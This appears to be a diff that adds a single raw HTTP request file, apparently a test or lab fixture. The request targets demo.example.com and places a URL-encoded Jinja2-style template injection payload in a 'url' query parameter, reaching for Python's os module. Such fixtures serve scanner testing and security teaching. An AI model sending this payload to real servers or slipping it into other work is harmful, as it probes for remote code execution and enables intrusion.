@@ -1,0 +1,4 @@
+GET /a?url=%7B%7Bjoiner.__init__.__globals__.os%7D%7D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
